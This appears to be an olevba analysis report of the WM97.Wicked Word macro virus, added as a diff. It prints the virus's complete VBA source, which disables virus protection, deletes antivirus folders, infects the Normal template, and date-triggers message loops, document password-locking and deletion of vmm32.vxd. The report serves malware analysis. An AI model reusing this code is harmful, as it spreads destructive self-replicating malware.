@@ -1,0 +1,730 @@
+olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: ./Virus.MSWord.Ultras.Wicked.b
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: ./Virus.MSWord.Ultras.Wicked.b - OLE stream: 'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO Wicked.bas 
+in file: ./Virus.MSWord.Ultras.Wicked.b - OLE stream: 'Macros/VBA/Wicked'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+'**********************************************************************
+'*                       WM97.Wicked BY ULTRAS                        *
+'*                            Version 1.1                             *
+'**********************************************************************
+Sub AutoOpen()
+On Error GoTo Wicked
+Options.VirusProtection = False
+Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
+Kill "C:\Program Files\Command Software\F-PROT95\*.*"
+Kill "C:\Program Files\McAfee\VirusScan\*.*"
+Kill "C:\Program Files\Norton AntiVirus\*.*"
+Kill "C:\Program Files\FindVirus\*.*"
+Kill "C:\f-macro\*.*"
+Kill "C:\Tbavw95\*.*"
+Call AutoClose
+Call Wicked
+Wicked:
+End Sub
+
+Sub AutoClose()
+On Error GoTo Wicked
+Application.ScreenUpdating = False
+Application.DisplayAlerts = wdAlertsNone
+Application.UserName = "ULTRAS"
+Application.UserInitials = "Wicked"
+Options.VirusProtection = False
+DocInfect = False
+GlobInfect = False
+For b = 1 To ActiveDocument.VBProject.VBComponents.Count
+If ActiveDocument.VBProject.VBComponents(b).Name = "Wicked" Then
+DocInfect = True
+End If
+Next
+For u = 1 To NormalTemplate.VBProject.VBComponents.Count
+If NormalTemplate.VBProject.VBComponents(u).Name = "Wicked" Then
+GlobInfect = True
+End If
+Next
+If DocInfect = False Then
+Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Wicked", Object:=wdOrganizerObjectProjectItems
+ActiveDocument.SaveAs filename:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
+End If
+If GlobInfect = False Then
+Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Wicked", Object:=wdOrganizerObjectProjectItems
+Options.SaveNormalPrompt = False
+End If
+Application.DisplayAlerts = wdAlertsAll
+Call Wicked
+Wicked:
+End Sub
+
+Sub FileSaveAs()
+Dialogs(wdDialogFileSaveAs).Show
+On Error GoTo Wicked
+Call Wicked
+Application.ScreenUpdating = False
+Application.DisplayAlerts = wdAlertsNone
+Application.UserName = "ULTRAS"
+Application.UserInitials = "Wicked"
+WordBasic.DisableAutoMacros 0
+Set GlobalDoc = NormalTemplate
+Set ActiveDoc = ActiveDocument
+GlobalInfect = False
+DocumentInfect = False
+For u = 1 To NormalTemplate.VBProject.VBComponents.Count
+If NormalTemplate.VBProject.VBComponents(u).Name = "Wicked" Then
+GlobalInfect = True
+End If
+Next
+For w = 1 To ActiveDocument.VBProject.VBComponents.Count
+If ActiveDocument.VBProject.VBComponents(w).Name = "Wicked" Then
+DocumentInfect = True
+End If
+Next
+If GlobalInfect = False Then
+Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Wicked", Object:=wdOrganizerObjectProjectItems
+Options.SaveNormalPrompt = False
+End If
+If DocumentInfect = False Then
+Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Wicked", Object:=wdOrganizerObjectProjectItems
+ActiveDocument.SaveAs filename:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
+End If
+Application.DisplayAlerts = wdAlertsAll
+Wicked:
+End Sub
+
+Sub FilePrint()
+On Error GoTo Wicked
+Set ULTRAS = ActiveDocument.Range(Start:=0, End:=0)
+With ULTRAS
+.InsertBefore "WICKED BY ULTRAS"
+.Font.Name = "Impact"
+.Font.Size = 36
+.Font.ColorIndex = 9
+.Font.Shadow = 1
+End With
+Wicked:
+Dialogs(wdDialogFilePrint).Show
+End Sub
+
+Sub ToolsMacro()
+On Error Resume Next
+Beep
+MsgBox " Not enought memory !! ", vbCritical + vbOKOnly + vbMsgBoxHelpButton + vbDefaultButton2, "WordBasic Err = 7"
+End Sub
+
+Sub ViewVBCode()
+On Error Resume Next
+Beep
+MsgBox " Not enought memory !! " & vbCrLf & "", vbExclamation + vbOKOnly + vbMsgBoxHelpButton + vbDefaultButton2, "WordBasic Err = 7"
+End Sub
+
+Sub FileTemplates()
+Beep
+End Sub
+
+Sub ToolsCustomize()
+Beep
+End Sub
+
+Sub Wicked()
+On Error GoTo Wicked
+If Day(Now()) = 3 Then
+Do
+MsgBox "You Infected WICKED by ULTRAS", vbCritical + vbOKOnly, "ULTRAS"
+Loop
+ActiveDocument.Password = "WICKED"
+ActiveDocument.Save
+End If
+If Day(Now()) = 16 Then
+Do
+MsgBox "You Infected WICKED by ULTRAS", vbCritical + vbOKOnly, "ULTRAS"
+Loop
+SetAttr "c:\Windows\System\vmm32.vxd", 0
+Kill "c:\Windows\System\vmm32.vxd"
+End If
+If Day(Now()) = 24 Then
+MsgBox "You Infected WM97.WICKED by ULTRAS", vbCritical + vbOKOnly, "ULTRAS"
+ActiveDocument.Password = "ULTRAS"
+ActiveDocument.Save
+End If
+Wicked:
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO VBA_P-code.txt 
+in file: VBA P-code - OLE stream: 'VBA P-code'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+' Processing file: ./Virus.MSWord.Ultras.Wicked.b
+' ===============================================================================
+' Module streams:
+' Macros/VBA/ThisDocument - 1182 bytes
+' Macros/VBA/Wicked - 7537 bytes
+' Line #0:
+' 	QuoteRem 0x0000 0x0046 "**********************************************************************"
+' Line #1:
+' 	QuoteRem 0x0000 0x0046 "*                       WM97.Wicked BY ULTRAS                        *"
+' Line #2:
+' 	QuoteRem 0x0000 0x0046 "*                            Version 1.1                             *"
+' Line #3:
+' 	QuoteRem 0x0000 0x0046 "**********************************************************************"
+' Line #4:
+' 	FuncDefn (Sub AutoOpen())
+' Line #5:
+' 	OnError Wicked 
+' Line #6:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #7:
+' 	LitStr 0x002A "C:\Program Files\AntiViral Toolkit Pro\*.*"
+' 	ArgsCall Kill 0x0001 
+' Line #8:
+' 	LitStr 0x002E "C:\Program Files\Command Software\F-PROT95\*.*"
+' 	ArgsCall Kill 0x0001 
+' Line #9:
+' 	LitStr 0x0025 "C:\Program Files\McAfee\VirusScan\*.*"
+' 	ArgsCall Kill 0x0001 
+' Line #10:
+' 	LitStr 0x0025 "C:\Program Files\Norton AntiVirus\*.*"
+' 	ArgsCall Kill 0x0001 
+' Line #11:
+' 	LitStr 0x001E "C:\Program Files\FindVirus\*.*"
+' 	ArgsCall Kill 0x0001 
+' Line #12:
+' 	LitStr 0x000E "C:\f-macro\*.*"
+' 	ArgsCall Kill 0x0001 
+' Line #13:
+' 	LitStr 0x000E "C:\Tbavw95\*.*"
+' 	ArgsCall Kill 0x0001 
+' Line #14:
+' 	ArgsCall (Call) AutoClose 0x0000 
+' Line #15:
+' 	ArgsCall (Call) Wicked 0x0000 
+' Line #16:
+' 	Label Wicked 
+' Line #17:
+' 	EndSub 
+' Line #18:
+' Line #19:
+' 	FuncDefn (Sub AutoClose())
+' Line #20:
+' 	OnError Wicked 
+' Line #21:
+' 	LitVarSpecial (False)
+' 	Ld Application 
+' 	MemSt ScreenUpdating 
+' Line #22:
+' 	Ld wdAlertsNone 
+' 	Ld Application 
+' 	MemSt DisplayAlerts 
+' Line #23:
+' 	LitStr 0x0006 "ULTRAS"
+' 	Ld Application 
+' 	MemSt UserName 
+' Line #24:
+' 	LitStr 0x0006 "Wicked"
+' 	Ld Application 
+' 	MemSt UserInitials 
+' Line #25:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #26:
+' 	LitVarSpecial (False)
+' 	St DocInfect 
+' Line #27:
+' 	LitVarSpecial (False)
+' 	St GlobInfect 
+' Line #28:
+' 	StartForVariable 
+' 	Ld B 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	MemLd Count 
+' 	For 
+' Line #29:
+' 	Ld B 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd New 
+' 	LitStr 0x0006 "Wicked"
+' 	Eq 
+' 	IfBlock 
+' Line #30:
+' 	LitVarSpecial (True)
+' 	St DocInfect 
+' Line #31:
+' 	EndIfBlock 
+' Line #32:
+' 	StartForVariable 
+' 	Next 
+' Line #33:
+' 	StartForVariable 
+' 	Ld u 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	MemLd Count 
+' 	For 
+' Line #34:
+' 	Ld u 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd New 
+' 	LitStr 0x0006 "Wicked"
+' 	Eq 
+' 	IfBlock 
+' Line #35:
+' 	LitVarSpecial (True)
+' 	St GlobInfect 
+' Line #36:
+' 	EndIfBlock 
+' Line #37:
+' 	StartForVariable 
+' 	Next 
+' Line #38:
+' 	Ld DocInfect 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	IfBlock 
+' Line #39:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x0006 "Wicked"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #40:
+' 	Ld ActiveDoc 
+' 	MemLd New 
+' 	ParamNamed filename 
+' 	Ld wdFormatTemplate 
+' 	ParamNamed FileFormat 
+' 	Ld ActiveDocument 
+' 	ArgsMemCall SaveAs 0x0002 
+' Line #41:
+' 	EndIfBlock 
+' Line #42:
+' 	Ld GlobInfect 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	IfBlock 
+' Line #43:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x0006 "Wicked"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #44:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt SaveNormalPrompt 
+' Line #45:
+' 	EndIfBlock 
+' Line #46:
+' 	Ld wdAlertsAll 
+' 	Ld Application 
+' 	MemSt DisplayAlerts 
+' Line #47:
+' 	ArgsCall (Call) Wicked 0x0000 
+' Line #48:
+' 	Label Wicked 
+' Line #49:
+' 	EndSub 
+' Line #50:
+' Line #51:
+' 	FuncDefn (Sub FileSaveAs())
+' Line #52:
+' 	Ld wdDialogFileSaveAs 
+' 	ArgsLd Dialogs 0x0001 
+' 	ArgsMemCall Show 0x0000 
+' Line #53:
+' 	OnError Wicked 
+' Line #54:
+' 	ArgsCall (Call) Wicked 0x0000 
+' Line #55:
+' 	LitVarSpecial (False)
+' 	Ld Application 
+' 	MemSt ScreenUpdating 
+' Line #56:
+' 	Ld wdAlertsNone 
+' 	Ld Application 
+' 	MemSt DisplayAlerts 
+' Line #57:
+' 	LitStr 0x0006 "ULTRAS"
+' 	Ld Application 
+' 	MemSt UserName 
+' Line #58:
+' 	LitStr 0x0006 "Wicked"
+' 	Ld Application 
+' 	MemSt UserInitials 
+' Line #59:
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemCall DisableAutoMacros 0x0001 
+' Line #60:
+' 	SetStmt 
+' 	Ld NormalTemplate 
+' 	Set GlobalDoc 
+' Line #61:
+' 	SetStmt 
+' 	Ld ActiveDocument 
+' 	Set ActiveDoc 
+' Line #62:
+' 	LitVarSpecial (False)
+' 	St GlobalInfect 
+' Line #63:
+' 	LitVarSpecial (False)
+' 	St DocumentInfect 
+' Line #64:
+' 	StartForVariable 
+' 	Ld u 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	MemLd Count 
+' 	For 
+' Line #65:
+' 	Ld u 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd New 
+' 	LitStr 0x0006 "Wicked"
+' 	Eq 
+' 	IfBlock 
+' Line #66:
+' 	LitVarSpecial (True)
+' 	St GlobalInfect 
+' Line #67:
+' 	EndIfBlock 
+' Line #68:
+' 	StartForVariable 
+' 	Next 
+' Line #69:
+' 	StartForVariable 
+' 	Ld w 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	MemLd Count 
+' 	For 
+' Line #70:
+' 	Ld w 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd New 
+' 	LitStr 0x0006 "Wicked"
+' 	Eq 
+' 	IfBlock 
+' Line #71:
+' 	LitVarSpecial (True)
+' 	St DocumentInfect 
+' Line #72:
+' 	EndIfBlock 
+' Line #73:
+' 	StartForVariable 
+' 	Next 
+' Line #74:
+' 	Ld GlobalInfect 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	IfBlock 
+' Line #75:
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x0006 "Wicked"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #76:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt SaveNormalPrompt 
+' Line #77:
+' 	EndIfBlock 
+' Line #78:
+' 	Ld DocumentInfect 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	IfBlock 
+' Line #79:
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	ParamNamed Source 
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	ParamNamed Destination 
+' 	LitStr 0x0006 "Wicked"
+' 	ParamNamed New 
+' 	Ld wdOrganizerObjectProjectItems 
+' 	ParamNamed On 
+' 	Ld Application 
+' 	ArgsMemCall OrganizerCopy 0x0004 
+' Line #80:
+' 	Ld ActiveDoc 
+' 	MemLd New 
+' 	ParamNamed filename 
+' 	Ld wdFormatTemplate 
+' 	ParamNamed FileFormat 
+' 	Ld ActiveDocument 
+' 	ArgsMemCall SaveAs 0x0002 
+' Line #81:
+' 	EndIfBlock 
+' Line #82:
+' 	Ld wdAlertsAll 
+' 	Ld Application 
+' 	MemSt DisplayAlerts 
+' Line #83:
+' 	Label Wicked 
+' Line #84:
+' 	EndSub 
+' Line #85:
+' Line #86:
+' 	FuncDefn (Sub FilePrint())
+' Line #87:
+' 	OnError Wicked 
+' Line #88:
+' 	SetStmt 
+' 	LitDI2 0x0000 
+' 	ParamNamed Start 
+' 	LitDI2 0x0000 
+' 	ParamNamed End 
+' 	Ld ActiveDocument 
+' 	ArgsMemLd Range 0x0002 
+' 	Set ULTRAS 
+' Line #89:
+' 	StartWithExpr 
+' 	Ld ULTRAS 
+' 	With 
+' Line #90:
+' 	LitStr 0x0010 "WICKED BY ULTRAS"
+' 	ArgsMemCallWith InsertBefore 0x0001 
+' Line #91:
+' 	LitStr 0x0006 "Impact"
+' 	MemLdWith Font 
+' 	MemSt New 
+' Line #92:
+' 	LitDI2 0x0024 
+' 	MemLdWith Font 
+' 	MemSt Size 
+' Line #93:
+' 	LitDI2 0x0009 
+' 	MemLdWith Font 
+' 	MemSt ColorIndex 
+' Line #94:
+' 	LitDI2 0x0001 
+' 	MemLdWith Font 
+' 	MemSt Shadow 
+' Line #95:
+' 	EndWith 
+' Line #96:
+' 	Label Wicked 
+' Line #97:
+' 	Ld wdDialogFilePrint 
+' 	ArgsLd Dialogs 0x0001 
+' 	ArgsMemCall Show 0x0000 
+' Line #98:
+' 	EndSub 
+' Line #99:
+' Line #100:
+' 	FuncDefn (Sub ToolsMacro())
+' Line #101:
+' 	OnError (Resume Next) 
+' Line #102:
+' 	ArgsCall Beep 0x0000 
+' Line #103:
+' 	LitStr 0x0017 " Not enought memory !! "
+' 	Ld vbCritical 
+' 	Ld vbOKOnly 
+' 	Add 
+' 	Ld vbMsgBoxHelpButton 
+' 	Add 
+' 	Ld vbDefaultButton2 
+' 	Add 
+' 	LitStr 0x0011 "WordBasic Err = 7"
+' 	ArgsCall MsgBox 0x0003 
+' Line #104:
+' 	EndSub 
+' Line #105:
+' Line #106:
+' 	FuncDefn (Sub ViewVBCode())
+' Line #107:
+' 	OnError (Resume Next) 
+' Line #108:
+' 	ArgsCall Beep 0x0000 
+' Line #109:
+' 	LitStr 0x0017 " Not enought memory !! "
+' 	Ld vbCrLf 
+' 	Concat 
+' 	LitStr 0x0000 ""
+' 	Concat 
+' 	Ld vbExclamation 
+' 	Ld vbOKOnly 
+' 	Add 
+' 	Ld vbMsgBoxHelpButton 
+' 	Add 
+' 	Ld vbDefaultButton2 
+' 	Add 
+' 	LitStr 0x0011 "WordBasic Err = 7"
+' 	ArgsCall MsgBox 0x0003 
+' Line #110:
+' 	EndSub 
+' Line #111:
+' Line #112:
+' 	FuncDefn (Sub FileTemplates())
+' Line #113:
+' 	ArgsCall Beep 0x0000 
+' Line #114:
+' 	EndSub 
+' Line #115:
+' Line #116:
+' 	FuncDefn (Sub ToolsCustomize())
+' Line #117:
+' 	ArgsCall Beep 0x0000 
+' Line #118:
+' 	EndSub 
+' Line #119:
+' Line #120:
+' 	FuncDefn (Sub Wicked())
+' Line #121:
+' 	OnError Wicked 
+' Line #122:
+' 	ArgsLd Now 0x0000 
+' 	ArgsLd Day 0x0001 
+' 	LitDI2 0x0003 
+' 	Eq 
+' 	IfBlock 
+' Line #123:
+' 	Do 
+' Line #124:
+' 	LitStr 0x001D "You Infected WICKED by ULTRAS"
+' 	Ld vbCritical 
+' 	Ld vbOKOnly 
+' 	Add 
+' 	LitStr 0x0006 "ULTRAS"
+' 	ArgsCall MsgBox 0x0003 
+' Line #125:
+' 	Loop 
+' Line #126:
+' 	LitStr 0x0006 "WICKED"
+' 	Ld ActiveDocument 
+' 	MemSt Password 
+' Line #127:
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Save 0x0000 
+' Line #128:
+' 	EndIfBlock 
+' Line #129:
+' 	ArgsLd Now 0x0000 
+' 	ArgsLd Day 0x0001 
+' 	LitDI2 0x0010 
+' 	Eq 
+' 	IfBlock 
+' Line #130:
+' 	Do 
+' Line #131:
+' 	LitStr 0x001D "You Infected WICKED by ULTRAS"
+' 	Ld vbCritical 
+' 	Ld vbOKOnly 
+' 	Add 
+' 	LitStr 0x0006 "ULTRAS"
+' 	ArgsCall MsgBox 0x0003 
+' Line #132:
+' 	Loop 
+' Line #133:
+' 	LitStr 0x001B "c:\Windows\System\vmm32.vxd"
+' 	LitDI2 0x0000 
+' 	ArgsCall SetAttr 0x0002 
+' Line #134:
+' 	LitStr 0x001B "c:\Windows\System\vmm32.vxd"
+' 	ArgsCall Kill 0x0001 
+' Line #135:
+' 	EndIfBlock 
+' Line #136:
+' 	ArgsLd Now 0x0000 
+' 	ArgsLd Day 0x0001 
+' 	LitDI2 0x0018 
+' 	Eq 
+' 	IfBlock 
+' Line #137:
+' 	LitStr 0x0022 "You Infected WM97.WICKED by ULTRAS"
+' 	Ld vbCritical 
+' 	Ld vbOKOnly 
+' 	Add 
+' 	LitStr 0x0006 "ULTRAS"
+' 	ArgsCall MsgBox 0x0003 
+' Line #138:
+' 	LitStr 0x0006 "ULTRAS"
+' 	Ld ActiveDocument 
+' 	MemSt Password 
+' Line #139:
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Save 0x0000 
+' Line #140:
+' 	EndIfBlock 
+' Line #141:
+' 	Label Wicked 
+' Line #142:
+' 	EndSub 
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
+|AutoExec  |AutoClose           |Runs when the Word document is closed        |
+|Suspicious|Kill                |May delete a file                            |
+|Suspicious|Command             |May run PowerShell commands                  |
+|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
+|Suspicious|Windows             |May enumerate application windows (if        |
+|          |                    |combined with Shell.Application object)      |
+|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|System              |May run an executable file or a system       |
+|          |                    |command on a Mac (if combined with           |
+|          |                    |libc.dylib)                                  |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
+|          |                    |code and P-code are different, this may have |
+|          |                    |been used to hide malicious code             |
++----------+--------------------+---------------------------------------------+
+VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues
+
